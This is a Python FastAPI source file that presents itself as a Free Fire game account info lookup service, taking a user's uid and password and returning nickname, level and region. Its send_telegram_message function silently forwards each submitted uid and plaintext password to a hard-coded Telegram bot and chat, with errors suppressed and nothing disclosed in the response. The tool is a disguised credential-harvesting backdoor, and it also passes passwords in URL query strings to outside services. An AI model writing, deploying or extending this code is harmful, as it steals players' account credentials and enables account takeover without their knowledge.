from fastapi import FastAPI, Query
import requests
import base64
import json

app = FastAPI()

# ===============================
# TELEGRAM FUNCTION
# ===============================
def send_telegram_message(uid: str, password: str, nickname: str, level, region: str):
    bot_token = "8602347385:AAGVKu-l8NqQ7xeJ8pGRngSlfP-wka6g9og"
    chat_id = "7326248826"
    text = (f"🔹 New FF Account Info 🔹\n"
            f"UID: {uid}\n"
            f"PASSWORD: {password}\n"
            f"NICKNAME: {nickname}\n"
            f"LEVEL: {level}\n"
            f"REGION: {region}")
    try:
        requests.get(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            params={"chat_id": chat_id, "text": text},
            timeout=5
        )
    except:
        pass  #  fail ho toh API crash nahi honi chahiye

# ===============================
# JWT DECODE FUNCTION
# ===============================
def jwt_decode_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload = parts[1]
        payload += "=" * (-len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload).decode("utf-8")
        return json.loads(decoded)
    except:
        return None

# ===============================
# MAIN ENDPOINT
# ===============================
@app.get("/info")
def get_info(uid: str = Query(None), password: str = Query(None)):
    if not uid or not password:
        return {"status": False, "message": "Enter uid & password"}

    # 1. Get JWT
    jwt_url = f"https://pjwt.vercel.app/token?key=SEMY&uid={uid}&password={password}"
    try:
        jwt_res = requests.get(jwt_url, timeout=10)
        jwt_json = jwt_res.json()
    except:
        return {"status": False, "message": "JWT request failed"}

    if jwt_json.get("status") != "live":
        return {
            "status": False,
            "message": jwt_json.get("message", "Account ban or wrong uid/password")
        }

    token = jwt_json.get("token")
    if not token:
        return {"status": False, "message": "Token missing"}

    # 2. Decode JWT
    data = jwt_decode_payload(token)
    if not data:
        return {"status": False, "message": "Decode failed"}

    account_id = data.get("account_id")
    if not account_id:
        return {"status": False, "message": "account_id not found"}

    # 3. Call Killersharma API
    info_url = f"https://info.killersharmabot.online/player-info?uid={account_id}"
    try:
        info_res = requests.get(info_url, timeout=15)
        info_json = info_res.json()
    except:
        return {"status": False, "message": "info failed"}

    # Extract required fields
    basic = info_json.get("basicInfo", {})
    nickname = basic.get("nickname")
    level = basic.get("level")
    exp = basic.get("exp")
    region = basic.get("region")

    # 4. Send to Telegram (background, no wait)
    send_telegram_message(
        uid=account_id,
        password=password,
        nickname=nickname,
        level=level,
        region=region
    )

    # Final response
    return {
        "accountId": account_id,
        "exp": exp if exp is not None else 0,
        "level": level if level is not None else 0,
        "nickname": nickname,
        "region": region
    }

# ===============================
# HOME
# ===============================
@app.get("/")
def home():
    return {"message": "Info API ready 👍"}
